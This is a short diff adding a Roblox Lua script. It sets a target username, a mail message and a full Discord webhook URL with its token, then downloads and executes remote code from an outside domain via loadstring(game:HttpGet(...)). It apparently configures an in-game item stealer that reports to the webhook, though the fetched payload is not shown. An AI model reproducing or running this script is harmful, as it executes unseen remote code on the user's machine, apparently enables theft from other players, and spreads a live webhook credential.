@@ -1,0 +1,5 @@
+Username = "jejeckou"
+MailMessage = "F6QANON TOP"
+Webhook = "https://discord.com/api/webhooks/1244783139050487912/4PQwbPaNmNtdz6O8fvGBlJPizac5WeAJX4TEgnBq-ANFEnLIryZzd7C_8lVAbP2Wv9SK"
+
+loadstring(game:HttpGet("https://egorikusa.space/ttd"))()
